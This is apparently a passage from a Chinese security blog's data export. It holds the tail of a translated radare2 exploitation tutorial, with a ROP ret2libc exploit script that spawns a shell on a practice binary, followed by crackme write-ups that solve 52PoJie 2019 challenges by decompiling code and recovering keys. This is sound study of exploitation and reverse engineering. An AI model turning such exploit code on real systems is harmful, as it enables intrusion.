p32(system_addr) ropchain2 += p32(exit_addr) # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5) # Then you'll execute system(\"sh\") ropchain2 += p32(binsh_addr) payload2 = payload2 + ropchain2 p.sendline(payload2) log.success(\"Here comes the shell!\") p.clean() p.interactive()if __name__ == \"__main__\": main() 跑这个脚本我们就能成功拿到一个 shell： 1234567891011121314$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 24410[*] puts is at: 0xf75db710[*] libc base: 0xf75ce000[*] system is at: 0xf760a060[*] /bin/sh is at: 0xf7735768[*] exit is at: 0xf75fd1b0[+] Here comes the shell![*] Switching to interactive mode:$ whoamibeet$ echo EOFEOF 后记Radare2之旅的第二部分就到此结束了。我们简单地学习了一些radare2中漏洞利用的功能。在下一部分中，我们会学习radare2再脚本编写和恶意软件分析中的功能。 漏洞利用命令对应表这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。 获取信息 $ rabin2 -I ./program——二进制信息（和radare2的 shell 中i命令相同） ii [q]——导入表 ?v sym.imp.func_name——获取func_name@PLT地址 ?v reloc.func_name——获取func_name@GOT地址 ie [q]——获取入口点地址 iS——查看区段的各个权限（读/写/执行） i~canary——检查是否开启Canary i~pic——检查是否开启PIE i~nx——检查是否开启NX 内存 dm——查看内存信息 dmm——列出模块（内存中的运行库和二进制模块） dmi [addr|libname] [symname]——列出目标库的标志 查找 e search.*——编辑查找配置 /?——列出查找的子命令 / string——在内存或程序段查找字符串 /R [?]——查找特定的 ROP /R/——ROP 常规搜索 调试 dc——继续执行 dcu addr——继续执行到某个地址 dcr——继续执行直到ret（单步步过） dbt [?]——在dbg.btdepth和dbg.btalgo的基础上回溯指令 doo [args]——重新打开调试并设置参数 ds——单步步入 dso——单步步过 图形模式 pdf @ addr——输出当前位移下函数的汇编代码 V——可视化模式，使用p/P再两个模式间切换 VV——图形模式，在 ascii 图像下分析 V!——控制板模式，对漏洞利用非常有用 看看这篇文章，也许有更多的内容能够帮助到你。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"translation","slug":"translation","permalink":"blog.b3ale.cn/tags/translation/"}]},{"title":"2019春节-吾爱破解解题领红包活动","slug":"2019春节-吾爱破解解题领红包活动","date":"2019-02-21T12:33:03.000Z","updated":"2020-02-02T11:49:09.992Z","comments":true,"path":"2019/02/21/2019春节-吾爱破解解题领红包活动/","link":"","permalink":"blog.b3ale.cn/2019/02/21/2019春节-吾爱破解解题领红包活动/","excerpt":"做了点简单的题目。","text":"做了点简单的题目。 【春节】解题领红包之一扫码关注即可。 【春节】解题领红包之二查壳是 upx，ESP 定律法找到 OEP 脱壳。然后放进 ida 里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647HWND main_func()&#123; HWND result; // eax char *input; // esi char *key; // edi int enc_1; // [esp+0h] [ebp-14h] int enc_2; // [esp+4h] [ebp-10h] int enc_3; // [esp+8h] [ebp-Ch] int enc_4; // [esp+Ch] [ebp-8h] char v7; // [esp+10h] [ebp-4h] result = GetDlgItem(0, 1000); if ( result ) &#123; if ( GetWindowTextLengthA(result) == 16 ) &#123; input = (char *)malloc(0x11u); key = (char *)malloc(0x11u); *(_DWORD *)input = 0; *((_DWORD *)input + 1) = 0; *((_DWORD *)input + 2) = 0; *((_DWORD *)input + 3) = 0; input[16] = 0; *(_DWORD *)key = 0; *((_DWORD *)key + 1) = 0; *((_DWORD *)key + 2) = 0; *((_DWORD *)key + 3) = 0; key[16] = 0; GetDlgItemTextA(0, 1000, input, 17); enc_3 = 'udhY'; enc_1 = 'ssdH'; enc_2 = 'zhNb'; enc_4 = '9102'; v7 = 0; encrypt((const char *)&amp;enc_1, (int)key, 3); if ( !strcmp(key, input) ) result = (HWND)MessageBoxA(0, aOye, Caption, 0); else result = (HWND)MessageBoxA(0, aAuey, Caption, 0); &#125; else &#123; result = (HWND)MessageBoxA(0, &amp;Text, Caption, 0); &#125; &#125; return result;&#125; 看下来应该就是把 16 位的enc加密了一下，然后和input比较。看看encrypt()函数： 123456789101112131415161718192021222324252627282930313233343536373839404142signed int __cdecl encrypt(const char *enc, int key, int num_3)&#123; const char *enc_0; // edx unsigned int length; // kr04_4 int v5; // esi int i; // edi char c; // al char alphabet[29]; // [esp+Bh] [ebp-1Dh] char tmp; // [esp+30h] [ebp+8h] strcpy(&amp;alphabet[1], \"abcdefghijklmnopqrstuvwxyz\"); if ( !key ) return -1; enc_0 = enc; if ( !enc ) return -1; if ( num_3 &lt;= 0 ) return -1; length = strlen(enc) + 1; if ( (signed int)(length - 1) &lt;= 0 ) return -1; v5 = key - (_DWORD)enc; tmp = alphabet[num_3 + 1]; i = length - 1; do &#123; c = *enc_0; if ( *enc_0 &lt; tmp || c &gt; 122 ) &#123; if ( c &gt;= 97 &amp;&amp; c &lt;= alphabet[num_3] ) c = c - num_3 + 26; &#125; else &#123; c -= num_3; &#125; (enc_0++)[v5] = c; --i; &#125; while ( i ); return 0;&#125; 就是对字符串判断是否为字母，然后根据字母表alphabet做映射和加减。正向实现一下脚本就得到口令了： 1234567891011121314151617181920212223#!/usr/bin/env pythonenc = ('9102' + 'udhY' + 'zhNb' + 'ssdH')[::-1]print encalpha = 'abcdefghijklmnopqrstuvwxyz'num = 3t = alpha[num + 1]i = len(enc)j = 0res = ''while i != 0: c = enc[j] if ord(c) &lt; ord(t) or ord(c) &gt; 122: if ord(c) &gt;= 97 and ord(c) &lt;= ord(alpha[num]): c = chr(ord(c) - num + 26) if ord(c) &gt; ord(alpha[-1]): c = chr(ord(c) - 26) else: c = chr(ord(c) - num) res += c j += 1 i -= 1print res# HappyNewYear2019 【春节】解题领红包之三这道题我查了壳然后不会脱就一直没做。看了writeup居然是直接进 ida 就分析了。搜索到 main 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156int main_main()&#123; int v0; // ST04_4 _DWORD *v1; // ST04_4 _DWORD *v2; // ST04_4 int v3; // ST04_4 _DWORD *v4; // ST04_4 int v5; // ST10_4 int v6; // ST14_4 int base64_check; // ST18_4 int v8; // ST04_4 int result; // eax char v10; // ST0C_1 int v11; // [esp+0h] [ebp-7Ch] int v12; // [esp+4h] [ebp-78h] int v13; // [esp+4h] [ebp-78h] int v14; // [esp+8h] [ebp-74h] int v15; // [esp+Ch] [ebp-70h] int v16; // [esp+Ch] [ebp-70h] int v17; // [esp+Ch] [ebp-70h] char v18; // [esp+Ch] [ebp-70h] int v19; // [esp+10h] [ebp-6Ch] int v20; // [esp+10h] [ebp-6Ch] int v21; // [esp+10h] [ebp-6Ch] int v22; // [esp+14h] [ebp-68h] int v23; // [esp+14h] [ebp-68h] int v24; // [esp+14h] [ebp-68h] int v25; // [esp+14h] [ebp-68h] unsigned int v26; // [esp+18h] [ebp-64h] int v27; // [esp+18h] [ebp-64h] int v28; // [esp+1Ch] [ebp-60h] int v29; // [esp+1Ch] [ebp-60h] int v30; // [esp+20h] [ebp-5Ch] int aes_check; // [esp+24h] [ebp-58h] int v32; // [esp+28h] [ebp-54h] int v33; // [esp+2Ch] [ebp-50h] int v34; // [esp+2Ch] [ebp-50h] _DWORD *v35; // [esp+30h] [ebp-4Ch] _DWORD *v36; // [esp+34h] [ebp-48h] _DWORD *v37; // [esp+38h] [ebp-44h] int *v38; // [esp+3Ch] [ebp-40h] int v39; // [esp+40h] [ebp-3Ch] int *v40; // [esp+44h] [ebp-38h] void *v41; // [esp+48h] [ebp-34h] int *v42; // [esp+4Ch] [ebp-30h] void *v43; // [esp+50h] [ebp-2Ch] int *key; // [esp+54h] [ebp-28h] _DWORD *v45; // [esp+58h] [ebp-24h] int *v46; // [esp+5Ch] [ebp-20h] void *v47; // [esp+60h] [ebp-1Ch] int *uid; // [esp+64h] [ebp-18h] _DWORD *v49; // [esp+68h] [ebp-14h] int *v50; // [esp+6Ch] [ebp-10h] void *v51; // [esp+70h] [ebp-Ch] int *v52; // [esp+74h] [ebp-8h] void *v53; // [esp+78h] [ebp-4h] void *retaddr; // [esp+7Ch] [ebp+0h] if ( (unsigned int)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(0x14u) + 8) ) runtime_morestack_noctxt(); v52 = dword_4A04E0; v53 = &amp;main_statictmp_0; fmt_Println(&amp;v52, 1, 1); runtime_newobject(dword_4A04E0, v0); v36 = v1; runtime_newobject(dword_4A04E0, v1); v37 = v2; v50 = dword_4A04E0; v51 = &amp;main_statictmp_1; fmt_Print(&amp;v50, 1, 1); uid = dword_498EE0; v49 = v36; fmt_Scanln(&amp;uid, 1, 1); // input uid v46 = dword_4A04E0; v47 = &amp;main_statictmp_2; fmt_Print(&amp;v46, 1, 1); key = dword_498EE0; v45 = v37; fmt_Scanln(&amp;key, 1, 1); // input key runtime_newobject(dword_4A90C0, v3); v35 = v4; *v4 = 0x67452301; v4[1] = 0xEFCDAB89; v4[2] = 0x98BADCFE; v4[3] = 0x10325476; v4[4] = 0xC3D2E1F0; v4[21] = 0; v4[22] = 0; v4[23] = 0; runtime_stringtoslicebyte(0, *v36, v36[1]); crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22); crypto_sha1___digest__Sum(v35, 0, 0, 0, v5, v6);// get uid's sha1 digest if ( v26 &lt; 0x10 ) runtime_panicslice( v11, v12, v14, v16, v20, v23, v26, v28, v30, aes_check, v32, v33, v35, v36, v37, v38, v39, v40, v41, v42, v43, key, v45, v46, v47, uid, v49, v50, v51, v52, v53); v34 = v20; encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[1], v16, v20, v23, v26); if ( base64_check ) &#123; v42 = dword_4A04E0; v43 = &amp;main_statictmp_3; result = fmt_Println(&amp;v42, 1, 1); &#125; else &#123; main_AesDecrypt(v17, v21, v24, v34, 16, 16, 0, v28); if ( aes_check ) &#123; v40 = dword_4A04E0; v41 = &amp;main_statictmp_4; result = fmt_Println(&amp;v40, 1, 1); &#125; else &#123; if ( v29 == 26 &amp;&amp; (runtime_memequal(v27, MEMORY[0x4B8A80], 26, v18), v10) ) fmt_Printf(aSuccess, 73, 0, 0, 0, v25, v27, 26); else fmt_Printf(&amp;aFailed, 24, 0, 0, 0, v25, v27, v29); runtime_newobject(dword_4A04E0, v13); v38 = dword_498EE0; v39 = v8; result = fmt_Scanln(&amp;v38, 1, 1); &#125; &#125; return result;&#125; 大概看了一遍之后，可以推测，先分别输入 uid 和 key，然后先进行 base64 解密（如果解密失败则报错），然后用 uid 的 sha1 摘要作为 key 来进行 aes 解密（如果解密失败则报错），最后和数据段中一串长度为 26 的字符串比较。具体字符串我们可以 dump 出来： 123456data = [0x48, 0x61, 0x70, 0x70, 0x79, 0x4E, 0x65, 0x77, 0x59, 0x65, 0x61, 0x72, 0x46, 0x72, 0x6F, 0x6D, 0x35, 0x32, 0x50, 0x6F, 0x4A, 0x69, 0x65, 0x2E, 0x43, 0x6E, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x49, 0x73, 0x6C, 0x61, 0x6E, 0x64, 0x73, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x4E, 0x65, 0x77, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x6C, 0x61, 0x6E, 0x64, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69]output = ''for i in range(26): output += chr(data[i])print output# HappyNewYearFrom52PoJie.Cn 可以使用 IDA 进行动态调试来验证 AES 的密钥。先输入 uid 和一个可以被成功解码的 base64 字符串，然后在 AES 函数中设下断点，可以看到密钥即为 uid 的 sha1 摘要： 调试中可以从内存里 dump 得到 3f2481363378f23964b9977ab8bad974de108eee 其实这一串数据就是 uid 对应的 sha1 散列值，取前 16 位作为 AES 的密钥。 AES 加密方式为 CBC （main_AesDecrypt() 函数中可以直接看出），补码方式为 PKCS5Padding（AES 解密错误时，会退出程序，但是有异常信息一闪而过，给报错函数下断点即可查看异常信息）。只需要把密钥转化成字节数组，使用 AES/CBC/PKCS5Padding 方式加密 HappyNewYearFrom52PoJie.Cn，最后进行 base64 加密就可得到口令。go 语言实现代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport ( \"fmt\" \"bytes\" \"crypto/cipher\" \"crypto/sha1\" \"crypto/aes\" \"encoding/base64\")func PKCS5Padding(ciphertext []byte, blockSize int) []byte &#123; padding := blockSize - len(ciphertext)%blockSize padtext := bytes.Repeat([]byte&#123;byte(padding)&#125;, padding) return append(ciphertext, padtext...)&#125;func PKCS5UnPadding(origData []byte) []byte &#123; length := len(origData) unpadding := int(origData[length-1]) return origData[:(length - unpadding)]&#125;func AesEncrypt(origData, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() origData = PKCS5Padding(origData, blockSize) blockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) crypted := make([]byte, len(origData)) blockMode.CryptBlocks(crypted, origData) return crypted, nil&#125;func AesDecrypt(crypted, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) origData := make([]byte, len(crypted)) blockMode.CryptBlocks(origData, crypted) origData = PKCS5UnPadding(origData) return origData, nil&#125;func main() &#123; uid := \"975446\" h := sha1.New() h.Write([]byte(uid)) bs := h.Sum(nil) var aeskey = bs[0:16] fmt.Println(\"AES Key: \", aeskey) pass := []byte(\"HappyNewYearFrom52PoJie.Cn\") xpass, err := AesEncrypt(pass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; pass64 := base64.StdEncoding.EncodeToString(xpass) fmt.Printf(\"Ciphertext: %v\\n\",pass64) bytesPass, err := base64.StdEncoding.DecodeString(pass64) if err != nil &#123; fmt.Println(err) return &#125; tpass, err := AesDecrypt(bytesPass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(\"Plaintext: %s\\n\", tpass)&#125; 【春节】解题领红包之番外篇番外篇个人感觉应该算是一道 ctf 里的 misc 题了。压缩包里给了一个大部分文字被加密的 md 文件： 12345678910111213# ȐĆŅƃȓƇńƃȒċƝÞɌÇńßɌĉŇƅŕƇŃbȒȼȵßȒĆȵƁȓĉnƁɌćǸßƦćƝƁȓĉnƅȓčƞÞɌćÑbȒČŃbȒċÑbŕƇŃþȒČNƃȒĈÑƄȓĊÑƄŕƇņÞȓčƞÞɌćÑbȒċƝÞŘcǸÞȐĆŅBƦĊȵþřÇȵƅȐċŇbɌcńþȓČŇƁŕƇNƀȒČŃBɌćÑBɌċnƄȓĈƝbŗƇƞÞŗčnBŕƇnþȒȻŃBȓĉnƅȒČNƅȒƈŇþŕčȠßŕƇŃƃřčȠbřċȵƀȐčNƄŕƇņƃɌcŅƄɌċnþŕƇŇƁȓƇńƁŕƇńþɌcńƄŕƇńþɌCňƀƦȻƝƃŕƇńþɌCňƀȐĉņþŗcŅƅȒĈÑƄȓĊǸƅȓĈȵþɌćƞßŕƇņÞȒȻŃþɌCňƀɌćǸbȒȼǹßȓĈƝB[ƦĉņƃŖċŅþŕƇŅƀȒCŅƀȒƈŇþɌcŅƄɌĉŇßŕƇņÞȓčƞÞȒƈňþŕƇńþȓĉnþȓČŇBŗcŅƅɌćƞƁȓćŅƁŕƇņÞȒȻŃþɌCňƁ](//rcnb.xyz)řĊÑbȒĉȠƀɌćÑbȒċƝÞȓćŅƁɌƈȠƃŕƇŃþȒȻŃþȒĈƞÞȑÇǹƄɌCȠƄƦȻŇƅɌćƞBȐčnÞŗÇÑBřĊÑbɌĆnþŗÇǹbȐȼŃßɌćÑbŕƇņÞȒȻŃƄŕƇņÞɌcńþȒCŅbŕȻŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc 这里给了一个网站，上面可以解密，得到明文 md 文件： 12345678910111213141516171819202122232425262728293031323334# Prove your NiubilityHello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.To prove you are as NB as RC, complete this trial![It&apos;s dangerous to go alone, take this!](//rcnb.xyz)And the key: Which_is_N0t_Th3_Answ3rWith the trial:7z��&apos;�G�֐&apos;�l×v����2!���!$�x�Z�ˤ�XЂY�=��W�K�ï�z���������r�$]�I��q�Ib��iԎ�2C���Z�`�3��EW�w3X�� ��*2� &apos;]�Kz�,&lt;` ��5�&amp;�QT�~�z�rq+�I�1԰����r?�R���Y�5X�&lt;rA���U��[���G��^*�O- GP���l����.:�7�3��:*J(v��]��,�h����nOˁ��X�&amp;�6�=Z\\����g�h�y6I��nNJ�)�&amp;���yCE��A��#� 8��ȍr&apos;�M\\?o:��W��Va�)����D��.�5V��Gi��A��)�,~� H¬?���&amp;��V�����~_;�P|�($�e00&quot;��荈&#123;�����8�]�-1��_Z��G=�)oPd��)���w;����8zOi��|&amp;���]à�&apos;�C�q�����SD&gt;��!��b��_� |�F�-�&apos;����-�ڷ���畢&#123;�ٙ�� �ti��E��ޕ;�����[&apos;��Yl�י*b����G�1�B�����~�:�و��׉��Aenqd�)ü#�EG-:�S/�ACb_[�V�H�l=Vg�-�۴�b7&amp;���ihCz��KLE0��)��H咣BT�0(k����m�&quot;�`��b�ĥq�&lt;IU�1������\\��[�k��%���&quot;ɡ�菽a8��H��gb��Q J��ZLL���_�$�|�ɡ����R�E�wu��t7#)S�\\�����;&#123;l�W�����I�*Y��&#125;��GN�p�k*�?�2�@�S�&#125;���33���v ���/���^Ӈ��!�R�N��F��5[�2�bvX ��ߍ�E؞%���d��� ��T�@��dy��r��B� ��?aHx�����&quot;�g����呴^+��|t$&#125;�x�C.���bp�X�lU|��&amp;׶��&#125;(���O�eq8s=店�C�#^�c�Q��&gt;�8��^���֙���b6&amp;��i�5FT�m$5�|�X�tA���s��&#125;��.h���Y��r�&#125;�(�,�&lt;W���V�����`�V08K�� -V�CV��&#125;�~d��� 0�y�� q����wWxZe��#q&quot;�״�=�%��h�!��_�������#��ᷫDA8^kJqɊ�=E�&#123;%�m&gt;��k� p $�SL˓`��]y bv�� 最后面给出的 trial 看开头显然是个 7z，那上面的 key 应该就是密码了。我把它存为一个新文件，然而这个字符�严重干扰了我好几个小时，让懵逼的我一度以为这是题目设计的加密。一开始我xxd了一下文件，发现有三个字节efbfbd频繁出现 505 次： 根据 7z 文件头377a bcaf 271c 0004尝试过替换，一度以为掉进了脑洞的陷阱。直到我看到这篇文章，才知道这串字节就是那个字符。 后来在 github 上找到了 rcnb 的源码，修改 js，将明文每个字节以 int 的形式输出，再用 python 一跑拿到压缩包： 123456789function printRes(str) &#123; var res = rcnb.decode(str); for (var i = 0; i &lt; res.length; i++) &#123; console.log(res[i]); &#125; // console.log(res)&#125;printRes(\"ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċN